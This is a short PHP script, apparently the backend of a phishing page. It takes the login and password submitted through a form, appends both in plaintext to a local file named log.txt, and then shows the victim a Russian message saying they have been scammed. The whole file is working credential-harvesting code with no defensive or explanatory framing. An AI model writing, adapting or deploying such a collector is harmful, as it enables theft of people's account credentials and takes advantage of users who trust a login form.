<?php
	$log = fopen("log.txt", "a");
	fwrite($log, "Логин: " . $_POST["login"] . " Пароль: " . $_POST["password"] . "\n");
	fclose($log);
	echo "Братан, тебя заскамили!";
?>